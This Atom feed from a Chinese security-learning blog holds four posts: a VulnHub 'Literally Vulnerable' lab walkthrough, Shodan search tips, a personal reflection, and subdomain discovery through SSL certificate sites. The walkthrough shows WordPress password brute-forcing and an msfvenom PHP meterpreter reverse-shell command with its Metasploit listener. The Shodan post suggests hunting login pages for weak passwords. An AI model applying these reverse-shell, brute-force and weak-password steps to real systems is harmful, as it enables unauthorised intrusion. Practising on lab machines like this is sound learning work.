<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>XTTF的小屋</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-12-15T05:55:22.557Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>XTTF</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Literally Vulnerable实验</title>
    <link href="http://yoursite.com/2019/12/15/UA%20Literally%20Vulnerable%E5%AE%9E%E9%AA%8C/"/>
    <id>http://yoursite.com/2019/12/15/UA Literally Vulnerable实验/</id>
    <published>2019-12-15T04:13:36.000Z</published>
    <updated>2019-12-15T05:55:22.557Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>在vm中启动试验机</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191215012023.png" alt=""></p><h3 id="探测IP地址"><a href="#探测IP地址" class="headerlink" title="探测IP地址"></a>探测IP地址</h3><p>首先执行本机<strong>ifconfig</strong>查看vm网卡地址</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191215012233.png" alt=""></p><p>使用nmap探测存活主机</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191215012323.png" alt=""></p><p>从中发现192.168.146.128为实验主机。</p><h3 id="探测端口信息"><a href="#探测端口信息" class="headerlink" title="探测端口信息"></a>探测端口信息</h3><p>使用nmap扫描实验主机端口开放信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">nmap -p- -A  192.168.146.128</div><div class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-15 01:25 CST</div><div class="line">Nmap scan report for literally.vulnerable (192.168.146.128)</div><div class="line">Host is up (0.00059s latency).</div><div class="line">Not shown: 65531 closed ports</div><div class="line">PORT      STATE SERVICE VERSION</div><div class="line">21/tcp    open  ftp     vsftpd 3.0.3</div><div class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</div><div class="line">|_-rw-r--r--    1 ftp      ftp           325 Dec 04 13:05 backupPasswords</div><div class="line">| ftp-syst: </div><div class="line">|   STAT: </div><div class="line">| FTP server status:</div><div class="line">|      Connected to ::ffff:192.168.146.129</div><div class="line">|      Logged in as ftp</div><div class="line">|      TYPE: ASCII</div><div class="line">|      No session bandwidth limit</div><div class="line">|      Session timeout in seconds is 300</div><div class="line">|      Control connection is plain text</div><div class="line">|      Data connections will be plain text</div><div class="line">|      At session startup, client count was 3</div><div class="line">|      vsFTPd 3.0.3 - secure, fast, stable</div><div class="line">|_End of status</div><div class="line">22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</div><div class="line">| ssh-hostkey: </div><div class="line">|   2048 2f:26:5b:e6:ae:9a:c0:26:76:26:24:00:a7:37:e6:c1 (RSA)</div><div class="line">|   256 79:c0:12:33:d6:6d:9a:bd:1f:11:aa:1c:39:1e:b8:95 (ECDSA)</div><div class="line">|_  256 83:27:d3:79:d0:8b:6a:2a:23:57:5b:3c:d7:b4:e5:60 (ED25519)</div><div class="line">80/tcp    open  http    nginx 1.14.0 (Ubuntu)</div><div class="line">|_http-generator: WordPress 5.3</div><div class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</div><div class="line">|_http-title: Not so Vulnerable &amp;#8211; Just another WordPress site</div><div class="line">|_http-trane-info: Problem with XML parsing of /evox/about</div><div class="line">65535/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</div><div class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</div><div class="line">|_http-title: Apache2 Ubuntu Default Page: It works</div><div class="line">MAC Address: 00:0C:29:01:26:7B (VMware)</div><div class="line">Device type: general purpose</div><div class="line">Running: Linux 3.X|4.X</div><div class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</div><div class="line">OS details: Linux 3.2 - 4.9</div><div class="line">Network Distance: 1 hop</div><div class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</div><div class="line"></div><div class="line">TRACEROUTE</div><div class="line">HOP RTT     ADDRESS</div><div class="line">1   0.58 ms literally.vulnerable (192.168.146.128)</div><div class="line"></div><div class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div><div class="line">Nmap done: 1 IP address (1 host up) scanned in 16.60 seconds</div></pre></td></tr></table></figure><p>从nmap的扫描信息得出 21端口存在anonymous访问</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191215013145.png" alt=""></p><p>到此，21端口结束。</p><p>打开80端口，访问主页发现使用了WordPress </p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191215013322.png" alt=""></p><p>这里没发现东西，接着尝试65535端口</p><p>经过跑目录发现了phpcms这个目录（这里我的字典没跑出来，看来还是太垃圾了）同样使用wpscan跑下用户名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">wpscan --url http://192.168.146.128:65535/phpcms/ --enumerate u</div><div class="line"></div><div class="line">......</div><div class="line"></div><div class="line">[+] notadmin</div><div class="line"> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div><div class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</div><div class="line"></div><div class="line">[+] maybeadmin</div><div class="line"> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div><div class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</div></pre></td></tr></table></figure><p>发现存在两个用户名notadmin和maybeadmin，这里通过上面21端口中的密码本，对密码进行爆破得到maybeadmin的密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">wpscan --url http://192.168.146.128:65535/phpcms/ -e u -P pass_wp.txt </div><div class="line"></div><div class="line"></div><div class="line">[+] maybeadmin</div><div class="line"> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div><div class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</div><div class="line"></div><div class="line">[+] notadmin</div><div class="line"> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div><div class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</div><div class="line"></div><div class="line">[+] Performing password attack on Xmlrpc against 2 user/s</div><div class="line">[SUCCESS] - maybeadmin / $EPid%J2L9LufO5                                                                                                                                                                                                                                             </div><div class="line">Trying notadmin / SCb$I^gDDqE34fA Time: 00:00:00 &lt;=================================================================================================================================================================================================&gt; (19 / 19) 100.00% Time: 00:00:00</div><div class="line"></div><div class="line">[i] Valid Combinations Found:</div><div class="line"> | Username: maybeadmin, Password: $EPid%J2L9LufO5</div></pre></td></tr></table></figure><h3 id="上传shell"><a href="#上传shell" class="headerlink" title="上传shell"></a>上传shell</h3><p>登录系统，发现一篇文章中有notadmin的密码 Pa$$w0rd13!&amp;，登入notadmin账号发现为wp管理员账号</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191215122600.png" alt=""></p><p>上传shell，这里我使用了msf的shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.146.131 LPORT=1234 -f raw &gt;shell.php</div></pre></td></tr></table></figure><p>通过wp的插件处上传shell</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191215125410.png" alt=""></p><p>上传成功保存在/phpcms/wp-content/uploads/2019/12/shell.php</p><p>现在开始配置msf监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">use exploit/multi/handler</div><div class="line">set payload php/meterpreter/reverse_tcp</div><div class="line">set lhost 192.168.146.131 </div><div class="line">set lport 1234</div></pre></td></tr></table></figure><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191215125648.png" alt=""></p><p>拿到shell</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191215130036.png" alt=""></p><p>后边提权的我再学学，太菜了。。。。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="vulnhub" scheme="http://yoursite.com/categories/vulnhub/"/>
    
    
      <category term="实验" scheme="http://yoursite.com/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>我用shodan的那些日子</title>
    <link href="http://yoursite.com/2019/11/08/%E6%88%91%E7%94%A8shodan%E7%9A%84%E9%82%A3%E4%BA%9B%E6%97%A5%E5%AD%90/"/>
    <id>http://yoursite.com/2019/11/08/我用shodan的那些日子/</id>
    <published>2019-11-08T04:13:36.000Z</published>
    <updated>2019-11-09T06:15:27.944Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>​    想当年第一次见到shodan还是一群大佬讨论摄像头的时候，当我打开大佬们的连接后，给我打开了新世界的大门，原来还有这等神器进行信息搜集。</p><p>​    在注册账号使用了一段时间后，我发现还是有个会员好使点，后来靠着臭不要脸的精神白嫖到一个账号（nice，爽），然后shodan便成为我挖漏洞前必备的神器。</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191109135542.png" alt=""></p><p>看，它长这样，它也有许多搜索语法就像google一样，这里列举我常用的几个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">http.title:&quot;关键字&quot;  // 用来查找标题包含关键字的</div><div class="line">http.html:&quot;关键字&quot;   // 用来查找html中包含关键字的</div><div class="line">country:&quot;CN&quot;   // 用来查找中国站点</div><div class="line"></div><div class="line">当使用组合查询时要这样使用</div><div class="line">http.title:&quot;关键字&quot; http.title:&quot;关键字&quot; 没错关键字得分开写</div></pre></td></tr></table></figure><p>我目前常用的就这三个（确实用的有点少）</p><p>用上面的来举个例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http.title:登录 country:&quot;CN&quot;</div></pre></td></tr></table></figure><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191109140451.png" alt=""></p><p>配合弱口令也能收割一些漏洞，当然侧边的过滤条件也可以选择</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191109140704.png" alt=""></p><p>点击后会出现在搜索的条件中，shodan是不是很不错啊（前提你需要一个会员，没会员玩个蛋）</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="信息搜集" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    
    
      <category term="学习" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>自己太菜了</title>
    <link href="http://yoursite.com/2019/11/02/2019_11_2/"/>
    <id>http://yoursite.com/2019/11/02/2019_11_2/</id>
    <published>2019-11-02T04:23:27.000Z</published>
    <updated>2019-11-02T05:51:37.578Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>​    我写这话想到什么说什么，从小作文就不好    </p><p>​    我把之前的文章都删掉了，可能是因为自己大学并没有学到什么东西（大部分时间在考虑社团发展），导致自己没有好好规划自己的学习路线。这几天看到自己之前的写的像是在水文章一样，还不如删掉重新写。</p><p>​    以后打算专注Python当然其他的东西也要搞，不然只会Python感觉很Low不过这都是后话了，现在在一家甲方做安全，每天说真的事情不多，所以要充分利用时间学习，万一有大佬推荐，想想就激动。</p><p>​    </p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
    
      <category term="学习" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>如何找到更多的域名之SSL证书</title>
    <link href="http://yoursite.com/2019/10/13/%E5%A6%82%E4%BD%95%E6%89%BE%E5%88%B0%E6%9B%B4%E5%A4%9A%E7%9A%84%E5%9F%9F%E5%90%8D%E4%B9%8BSSL%E8%AF%81%E4%B9%A6/"/>
    <id>http://yoursite.com/2019/10/13/如何找到更多的域名之SSL证书/</id>
    <published>2019-10-13T08:13:36.000Z</published>
    <updated>2019-10-13T10:08:16.358Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h4 id="如何找到更多的域名之SSL证书"><a href="#如何找到更多的域名之SSL证书" class="headerlink" title="如何找到更多的域名之SSL证书"></a>如何找到更多的域名之SSL证书</h4><p>简单的来说就是服务器SSL证书，常见的网站前面的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.domain.com</div></pre></td></tr></table></figure><p>这里推荐一个网站certdb，当然除了这个还有几个网站，我感觉第一个挺不错的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">https://certdb.com</div><div class="line">https://crt.sh</div><div class="line">https://censys.io/</div></pre></td></tr></table></figure><p>那么，使用下</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191013173553.png" alt=""></p><p>这是一个英文网站，中间的搜索框写域名即可，这里举一个例子就是baidu</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/1570959603062.png" alt=""></p><p>点击DETAILS（详情），在新页面拉到底部</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191013174052.png" alt=""></p><p>一共4096个相关域名</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191013174555.png" alt=""></p><p>通过这张图能获得许多信息，可以挖各种漏洞，比如子域名接管（hackerone给的特别多，还是美刀）</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191013174456.png" alt=""></p><p>在上张图片的下面还能看到一些网段，里面可能就有这家公司的专属网段，用nmap查开放端口、找中间件漏洞</p><p><img src="https://blog-xttf.oss-cn-beijing.aliyuncs.com/20191013180759.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="信息搜集" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    
    
      <category term="学习" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
</feed>
